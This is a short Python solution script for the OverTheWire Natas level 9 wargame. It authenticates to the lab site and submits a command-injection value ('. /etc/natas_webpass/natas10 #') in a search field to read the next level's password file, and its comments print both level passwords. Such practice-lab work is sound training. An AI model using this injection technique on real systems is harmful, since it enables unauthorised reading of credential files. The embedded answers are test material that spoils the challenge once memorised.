#!/usr/bin/env python
#Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
#/etc/natas_webpass/natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

import requests 

username =  'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'
siteUrl  = 'http://{}.natas.labs.overthewire.org/index-source.html'.format(username)

def loginWebSite():
    r = requests.get(siteUrl, auth = (username,password))
    print(r.text)

def commandInjection():
    siteUrl = 'http://natas9.natas.labs.overthewire.org/'
    command_injection =  '. /etc/natas_webpass/natas10 #'           #nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
    
    session = requests.Session()
    r = session.post(siteUrl, auth = (username,password), data = {"needle":command_injection, "submit":"submit"})
    print(r.text)

#loginWebSite()
commandInjection()